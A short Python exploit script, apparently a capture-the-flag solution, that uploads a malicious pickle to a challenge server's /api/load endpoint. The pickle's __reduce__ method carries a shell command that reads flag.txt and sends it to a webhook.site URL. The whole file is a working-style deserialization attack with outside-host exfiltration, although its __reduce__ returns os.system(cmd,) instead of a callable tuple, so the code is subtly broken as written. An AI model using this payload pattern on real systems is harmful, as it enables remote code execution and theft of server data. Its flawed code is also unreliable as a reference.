import os
import pickle
import requests


class RCE:
    def __reduce__(self):
        cmd = 'python -c "import urllib.request;f=open(\'flag.txt\').read();urllib.request.urlopen(\'https://webhook.site/f75ca570-d7d0-41f7-b3b0-2d69c26c4908?hehe=\'+f)"'
        return os.system(cmd,)


payload = {"file": ("hehe.pkl", pickle.dumps(RCE()))}
response = requests.post(
    "https://text-adventure-api.chall.pwnoh.io/api/load", files=payload)
print(response.text)
